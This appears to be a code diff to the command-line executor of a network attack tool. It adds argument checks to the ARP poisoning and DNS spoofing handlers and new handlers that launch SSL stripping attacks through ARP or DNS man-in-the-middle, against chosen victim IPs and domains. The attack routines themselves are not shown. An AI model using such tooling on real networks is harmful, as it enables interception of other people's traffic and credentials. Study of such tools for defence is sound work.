@@ -4,10 +4,12 @@
 #include "helper/CLIParser.h"
 #include "helper/CLITypes.h"
 #include "log.h"
+#include "ssl_stripping/public.h"
 
 #include <iterator>
 #include <optional>
 #include <sstream>
+#include <stdexcept>
 #include <string>
 #include <unordered_set>
 #include <vector>
@@ -49,6 +51,7 @@ void CLIExecutor::invokeArpPoison(std::vector<std::string> args) {
         (stringToBool(args[0]) && args.size() != SILENT_NUM_ARGS)) {
         LOG_ERROR(
             "Found wrong number of arguments for executing poisoning attack");
+        throw std::runtime_error("Wrong number of arguments");
     }
     if (!stringToBool(args[0])) { // all out
         ATK::ARP::allOutPoison(
@@ -74,6 +77,7 @@ void CLIExecutor::invokeDnsSpoofing(std::vector<std::string> args) {
         (stringToBool(args[0]) && args.size() != SILENT_NUM_ARGS)) {
         LOG_ERROR(
             "Found wrong number of arguments for executing poisoning attack");
+        throw std::runtime_error("Wrong number of arguments");
     }
     if (!stringToBool(args[0])) { // all-out
         ATK::DNS::allOutPoison(
@@ -91,6 +95,66 @@ void CLIExecutor::invokeDnsSpoofing(std::vector<std::string> args) {
                                 .attackerIp = args[2],
                                 .victimIps = victimpIpsSet,
                                 .domainsToSpoof = domainsToSpoofSet});
+    }
+}
+
+void CLIExecutor::invokeSslStrippingArp(std::vector<std::string> args) {
+    const int ALL_OUT_NUM_ARGS = 2;
+    const int SILENT_NUM_ARGS = 4;
+    if ((!stringToBool(args[0]) && args.size() != ALL_OUT_NUM_ARGS) ||
+        (stringToBool(args[0]) && args.size() != SILENT_NUM_ARGS)) {
+        LOG_ERROR("Found wrong number of arguments for executing ssl attack "
+                  "under arp");
+        throw std::runtime_error("Wrong number of arguments");
+    }
+    if (!stringToBool(args[0])) { // all-out
+        ATK::SSL::allOutStrip(ATK::SSL::AllOutStrippingOptions{
+            .ifaceIpOrName = args[1],
+            .attackerIp = std::nullopt,
+            .mitmStrategy = ATK::SSL::MitmStrategy::ARP});
+    } else { // silent
+        std::vector<std::string> victimIps = split(args[2], ',');
+        const std::unordered_set<std::string> victimIpsSet(victimIps.begin(),
+                                                           victimIps.end());
+        std::vector<std::string> domainsToStrip = split(args[3], ',');
+        const std::unordered_set<std::string> domainsToStripSet(
+            domainsToStrip.begin(), domainsToStrip.end());
+        ATK::SSL::silentStrip(ATK::SSL::SilentStrippingOptions{
+            .ifaceIpOrName = args[1],
+            .attackerIp = std::nullopt,
+            .victimIps = victimIpsSet,
+            .domainsToStrip = domainsToStripSet,
+            .mitmStrategy = ATK::SSL::MitmStrategy::ARP});
+    }
+}
+
+void CLIExecutor::invokeSslStrippingDns(std::vector<std::string> args) {
+    const int ALL_OUT_NUM_ARGS = 3;
+    const int SILENT_NUM_ARGS = 5;
+    if ((!stringToBool(args[0]) && args.size() != ALL_OUT_NUM_ARGS) ||
+        (stringToBool(args[0]) && args.size() != SILENT_NUM_ARGS)) {
+        LOG_ERROR("Found wrong number of arguments for executing ssl attack "
+                  "under dns");
+        throw std::runtime_error("Wrong number of arguments");
+    }
+    if (!stringToBool(args[0])) { // all-out
+        ATK::SSL::allOutStrip(ATK::SSL::AllOutStrippingOptions{
+            .ifaceIpOrName = args[1],
+            .attackerIp = args[2],
+            .mitmStrategy = ATK::SSL::MitmStrategy::DNS});
+    } else { // silent
+        std::vector<std::string> victimIps = split(args[3], ',');
+        const std::unordered_set<std::string> victimIpsSet(victimIps.begin(),
+                                                           victimIps.end());
+        std::vector<std::string> domainsToStrip = split(args[4], ',');
+        const std::unordered_set<std::string> domainsToStripSet(
+            domainsToStrip.begin(), domainsToStrip.end());
+        ATK::SSL::silentStrip(ATK::SSL::SilentStrippingOptions{
+            .ifaceIpOrName = args[1],
+            .attackerIp = args[2],
+            .victimIps = victimIpsSet,
+            .domainsToStrip = domainsToStripSet,
+            .mitmStrategy = ATK::SSL::MitmStrategy::DNS});
     }
 }
 
